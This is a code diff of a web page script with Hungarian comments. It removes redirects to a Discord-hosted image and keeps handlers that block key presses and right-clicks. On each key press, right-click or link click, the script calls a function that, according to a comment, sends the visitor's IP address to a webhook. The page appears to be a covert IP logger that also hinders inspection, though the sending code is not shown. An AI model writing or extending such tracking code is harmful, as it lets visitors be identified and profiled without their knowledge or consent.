@@ -180,7 +180,6 @@
                 e.preventDefault();
                 enqueueIpSend(`Tiltott billentyű: ${e.key}`, 'billentyű kombináció');
                 // Ne csinálj automatikus átirányítást a billentyűkombináció miatt
-                window.location.href = 'https://cdn.discordapp.com/attachments/1165581521567105035/1400847670939222206/Messenger_creation_1054362723469051.jpg?ex=688e208f&is=688ccf0f&hm=29ab0c2ba9d2c19e9185b72037431fc7bbc2a27e399ab386403dcdfaefdeeba1&';
             }
         });
 
@@ -188,16 +187,15 @@
         document.addEventListener('contextmenu', function (e) {
             e.preventDefault();
             enqueueIpSend('Jobb klikk', 'jobb klikk');
-            window.location.href = 'https://cdn.discordapp.com/attachments/1165581521567105035/1400847670939222206/Messenger_creation_1054362723469051.jpg?ex=688e208f&is=688ccf0f&hm=29ab0c2ba9d2c19e9185b72037431fc7bbc2a27e399ab386403dcdfaefdeeba1&';
         });
 
         // Link kattintás – IP küldése külön webhookra
         const link = document.querySelector('a');
         if (link) {
             link.addEventListener('click', function (e) {
-                e.preventDefault();
+                e.preventDefault();  // Megakadályozzuk az alapértelmezett kattintást
                 enqueueIpSend('Link kattintás', 'link kattintás');
-                window.location.href = link.href;
+                window.location.href = link.href; // Végrehajtjuk az átirányítást
             });
         }
 
